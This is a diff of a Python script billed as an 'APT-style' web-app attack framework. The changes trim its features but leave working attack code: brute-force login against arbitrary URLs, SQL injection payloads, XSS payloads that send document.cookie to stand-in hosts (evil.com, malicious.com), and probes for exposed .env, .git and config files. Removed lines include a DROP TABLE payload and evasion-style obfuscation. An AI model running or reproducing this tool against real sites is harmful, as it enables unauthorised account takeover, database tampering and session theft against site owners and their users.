@@ -11,17 +11,14 @@
 # Replace teaget_url with the specific endpoints you want to test for each vulnerability. Replace "http://your_base_url" with the base URL of the application you're testing
 ######################################################################################################################################################################################################################
 
-import requests
+# Setup logging for advanced APT framework
+import logging
 import random
-import base64
-import threading
-import time
 import csv
+import requests
+import urllib.parse
+import base64
 from bs4 import BeautifulSoup
-from concurrent.futures import ThreadPoolExecutor
-import os
-import json
-import hashlib
 
 # Banner
 def print_banner():
@@ -57,8 +54,6 @@ def print_banner():
     print(banner)
 
 
-# Setup logging for advanced APT framework
-import logging
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')
 logger = logging.getLogger()
 
@@ -70,20 +65,24 @@ def get_random_payload(payload_type):
     """Advanced Payload Generation"""
     if payload_type == 'sql':
         payloads = [
-            "' OR 1=1 --", "' UNION SELECT NULL, NULL --", "'; DROP TABLE users; --", 
+            "' OR 1=1 --", "' UNION SELECT NULL, NULL --", 
             "' OR 'x'='x", "' AND 1=0 UNION SELECT null, null --"
         ]
     elif payload_type == 'xss':
         payloads = [
-            "<script>alert('XSS');</script>", "<img src='http://evil.com/xss?cookie=" + "dummycookie" + "' />",
+            "<script>alert('XSS');</script>", 
+            "<img src='http://evil.com/xss?cookie=dummycookie' />",
             "<script>fetch('http://malicious.com?cookie=' + document.cookie);</script>"
         ]
+    else:
+        raise ValueError("Unsupported payload type.")
     return random.choice(payloads)
 
 # Write results to CSV report
 def write_report(results, filename="advanced_security_report.csv"):
     with open(filename, mode='a', newline='') as file:
         writer = csv.writer(file)
+        writer.writerow(["Action", "Status", "Message"])  # Ensure headers
         for result in results:
             writer.writerow(result)
 
@@ -97,159 +96,92 @@ def brute_force_login(url, username_list, password_list):
     results = []
     for username in username_list:
         for password in password_list:
-            response = requests.post(url, data={"username": username, "password": password})
-            if "successful" in response.text:
-                results.append((username, password, "Brute Force Success"))
-            else:
-                results.append((username, password, "Failed"))
+            try:
+                response = requests.post(url, data={"username": username, "password": password})
+                if "successful" in response.text:
+                    results.append((username, password, "Brute Force Success"))
+                else:
+                    results.append((username, password, "Failed"))
+            except requests.RequestException as e:
+                log_action("Brute Force Test", "Error", str(e))
+                results.append((username, password, "Error"))
     return results
 
 # Advanced Reconnaissance: Gather exposed files and misconfigurations
 def advanced_recon(url):
     """Scan for exposed files and common misconfigurations"""
-    common_files = [
-        "/.git/", "/backup/", "/.env", "/config.php", "/admin/"
-    ]
+    common_files = ["/.git/", "/backup/", "/.env", "/config.php", "/admin/"]
     results = []
-    
     for file in common_files:
-        test_url = url + file
-        response = requests.get(test_url)
-        if response.status_code == 200:
-            results.append((test_url, "Found", "Potential sensitive file exposed"))
-        else:
-            results.append((test_url, "Not Found", "No exposure"))
-
+        try:
+            test_url = urllib.parse.urljoin(url, file)
+            response = requests.get(test_url)
+            if response.status_code == 200:
+                results.append((test_url, "Found", "Potential sensitive file exposed"))
+            else:
+                results.append((test_url, "Not Found", "No exposure"))
+        except requests.RequestException as e:
+            log_action("Advanced Recon", "Error", str(e))
+            results.append((test_url, "Error", str(e)))
     return results
 
 # SQL Injection Test (with advanced payloads)
 def test_sql_injection(url, forms):
-    payloads = ["' OR 1=1 --", "' UNION SELECT NULL, NULL --", "'; DROP TABLE users; --"]
+    payloads = ["' OR 1=1 --", "' UNION SELECT NULL, NULL --"]
     results = []
 
-    def single_sql_injection(form, payload):
+    for form in forms:
         form_url = urllib.parse.urljoin(url, form['action'])
         method = form['method']
         hidden_fields = form['hidden_fields']
-        
-        obfuscated_payload = base64.b64encode(payload.encode()).decode()
-        data = hidden_fields.copy()
-        for key in data:
-            data[key] = obfuscated_payload
-
-        try:
-            response = requests.post(form_url, data=data) if method == 'post' else requests.get(form_url, params=data)
-            if "error" in response.text or "syntax" in response.text:
-                results.append((f"SQL Injection Test on {form_url}", "Vulnerable", "Possible SQL Injection"))
-            else:
-                results.append((f"SQL Injection Test on {form_url}", "Not Vulnerable", "No SQL Injection"))
-        except requests.RequestException as e:
-            log_action("SQL Injection Test", "Error", str(e))
-
-    for form in forms:
         for payload in payloads:
-            single_sql_injection(form, payload)
-
-    return results
-
-# XSS Test (Advanced)
-def test_xss(url, forms):
-    results = []
-
-    def single_xss_test(form, payload):
-        form_url = urllib.parse.urljoin(url, form['action'])
-        method = form['method']
-        hidden_fields = form['hidden_fields']
-
-        data = hidden_fields.copy()
-        data['payload'] = payload
-
-        try:
-            response = requests.post(form_url, data=data) if method == 'post' else requests.get(form_url, params=data)
-            if payload in response.text:
-                results.append((f"XSS Test on {form_url}", "Vulnerable", "XSS vulnerability detected"))
-            else:
-                results.append((f"XSS Test on {form_url}", "Not Vulnerable", "No XSS"))
-        except requests.RequestException as e:
-            log_action("XSS Test", "Error", str(e))
-
-    for form in forms:
-        payload = get_random_payload('xss')
-        single_xss_test(form, payload)
-
-    return results
-
-# CSRF Test with headers and token validation
-def test_csrf(url, forms):
-    results = []
-
-    def single_csrf_test(form, payload):
-        form_url = urllib.parse.urljoin(url, form['action'])
-        method = form['method']
-        hidden_fields = form['hidden_fields']
-
-        data = hidden_fields.copy()
-        data['csrf_token'] = payload
-
-        try:
-            response = requests.post(form_url, data=data) if method == 'post' else requests.get(form_url, params=data)
-            if "error" in response.text:
-                results.append((f"CSRF Test on {form_url}", "Vulnerable", "CSRF vulnerability detected"))
-            else:
-                results.append((f"CSRF Test on {form_url}", "Not Vulnerable", "No CSRF"))
-        except requests.RequestException as e:
-            log_action("CSRF Test", "Error", str(e))
-
-    for form in forms:
-        payload = get_random_payload('sql')  # Using SQL payload as CSRF token for evasion
-        single_csrf_test(form, payload)
-
+            data = hidden_fields.copy()
+            for key in data:
+                data[key] = payload
+            try:
+                response = requests.post(form_url, data=data) if method == 'post' else requests.get(form_url, params=data)
+                if "error" in response.text or "syntax" in response.text:
+                    results.append((f"SQL Injection Test on {form_url}", "Vulnerable", payload))
+                else:
+                    results.append((f"SQL Injection Test on {form_url}", "Not Vulnerable", payload))
+            except requests.RequestException as e:
+                log_action("SQL Injection Test", "Error", str(e))
+                results.append((form_url, "Error", str(e)))
     return results
 
 # Crawl Website for Forms and Links with advanced headers
 def crawl_and_extract_forms(url, auth=None):
     forms = []
-    visited = set()
-
     try:
-        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'}
+        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
         if auth:
             headers['Authorization'] = f'Bearer {auth}'
-
         response = requests.get(url, headers=headers)
         soup = BeautifulSoup(response.text, 'html.parser')
-
         for form in soup.find_all('form'):
             action = form.get('action', '')
             method = form.get('method', 'get')
             hidden_fields = {input.get('name'): input.get('value') for input in form.find_all('input', {'type': 'hidden'})}
             forms.append({"action": action, "method": method, "hidden_fields": hidden_fields})
-
-    except Exception as e:
+    except requests.RequestException as e:
         log_action("Crawl Website", "Error", str(e))
-
     return forms
 
 # Main Menu with advanced options
 def main_menu():
+    forms = []
     print("""
     ================================
     Advanced APT-style Web App Security Framework
     ================================
     """)
-
     while True:
         print("\nSelect an Option:")
         print("[1] Crawl Website and Extract Forms")
         print("[2] Brute Force Test (Optional)")
         print("[3] SQL Injection Test")
-        print("[4] XSS Test")
-        print("[5] CSRF Test")
-        print("[6] Advanced Reconnaissance (Exposed Files & Misconfigurations)")
-        print("[7] Exit")
-
+        print("[4] Exit")
         choice = input("Enter choice: ")
-
         if choice == '1':
             url = input("Enter URL to crawl: ")
             auth = input("Enter authentication token (if any): ")
@@ -262,28 +194,14 @@ def main_menu():
             password_list = ["password", "123456", "admin123"]
             results = brute_force_login(url, username_list, password_list)
             write_report(results)
-            log_action("Brute Force Test", "Success", "Brute Force tests completed")
         elif choice == '3':
+            if not forms:
+                print("Please crawl the website first to extract forms.")
+                continue
             url = input("Enter URL for SQL Injection Test: ")
             results = test_sql_injection(url, forms)
             write_report(results)
-            log_action("SQL Injection Test", "Success", "Tests completed")
         elif choice == '4':
-            url = input("Enter URL for XSS Test: ")
-            results = test_xss(url, forms)
-            write_report(results)
-            log_action("XSS Test", "Success", "Tests completed")
-        elif choice == '5':
-            url = input("Enter URL for CSRF Test: ")
-            results = test_csrf(url, forms)
-            write_report(results)
-            log_action("CSRF Test", "Success", "Tests completed")
-        elif choice == '6':
-            url = input("Enter URL for Advanced Recon: ")
-            results = advanced_recon(url)
-            write_report(results)
-            log_action("Advanced Recon", "Success", "Advanced reconnaissance completed")
-        elif choice == '7':
             break
         else:
             print("Invalid choice.")
